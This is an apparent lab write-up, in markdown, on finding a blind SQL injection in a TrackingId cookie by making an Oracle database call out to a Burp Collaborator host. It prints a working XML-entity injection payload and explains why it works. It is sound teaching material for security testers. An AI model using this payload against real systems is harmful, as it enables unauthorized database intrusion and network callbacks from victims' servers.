## 🎯 Objective

Identify and exploit a **blind SQL injection vulnerability** where:

- No SQL errors are returned
- No response content changes
- No time-based delays work

and confirm exploitation by forcing the **database to initiate an external (out-of-band) interaction** using Burp Collaborator.

---

## 🧩 1. Initial Recon & Failure of Standard Techniques

### Parameters Tested

- URL parameters
- POST body parameters
- Cookie parameter: `TrackingId`

### Observations

- Injecting a single quote (`'`) into all parameters caused **no errors**
- Boolean-based payloads produced **no response differences**
- Time-based payloads (`pg_sleep`, `sleep`, etc.) showed **no delay**

At this stage, **all traditional blind SQLi techniques failed**.

---

### 🔴 Critical Observation (Why This Matters)

The absence of errors, delays, or response differences does NOT mean the application is secure.

This is exactly the scenario where many testers give up — and that’s how real vulnerabilities slip through. 

---

## 🧠 2. Mindset Shift: Stop Listening to the App

When the application is silent, you must force the database to communicate with you through the network.

Key realization:

- The application is no longer your feedback channel
- DNS / HTTP interactions become your **oracle**
- If the database can reach the internet, you can confirm SQL execution **without seeing anything on the page**

This is the core idea behind **out-of-band (OAST) SQL injection**.

---

## 🔍 3. Database Fingerprinting Strategy

Since the backend database was unknown, payloads were tested for **multiple DBMS types**, starting with Oracle.

Oracle is a prime candidate because:

- It supports XML parsing inside SQL
- It allows external entity resolution
- It requires the `dual` table

---

## 💣 4. Exploitation Payload (Oracle)

The following payload was injected into the **TrackingId cookie parameter** (URL-encoded in the actual request):

```sql
'|| (SELECT EXTRACTVALUE(
    xmltype(
      '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY% remoteSYSTEM "http://<BURP-COLLABORATOR>">
%remote;
       ]>'
    ),
    '/l'
) FROM dual) --
```

---

## 🧠 Why This Payload Works (Important)

- `xmltype()` parses XML inside the database
- `EXTRACTVALUE()` forces evaluation
- External entity resolution causes the database to make an outbound request
- `FROM dual` confirms Oracle-specific syntax
- The application never needs to return anything

This is pure **out-of-band confirmation**. Silent app, loud database. Beautiful as fuck.

---

## 📡 5. Confirmation via Burp Collaborator

### Result

- A DNS / HTTP interaction appeared in Burp Collaborator
- The interaction originated from the target server
- No change occurred in the HTTP response
- No delay was observed in the browser

---

### ✅ What This Confirms

- SQL injection exists
- User input is executed by the database
- The backend DBMS is **Oracle**
- The database can initiate external network connections

That’s game over.

---

## 🏁 6. Final Outcome

- Vulnerability successfully identified
- Out-of-band SQL injection confirmed
- Lab marked as **Solved**
- <img width="1419" height="268" alt="image" src="https://github.com/user-attachments/assets/c8d64f62-1b53-40e6-8587-f7f70a13e857" />


No guessing. No assumptions. Just hard confirmation.

---

## 🧭 7. Key Takeaways (For Future You)

- No output ≠ no SQL injection
- If boolean and time-based fail, **switch to OAST**
- Always test:
    - XML
    - DNS
    - HTTP callbacks
- Burp Collaborator is not optional — it’s mandatory on hardened targets

If you don’t test out-of-band interaction, you will miss real-world SQL injection. Period.
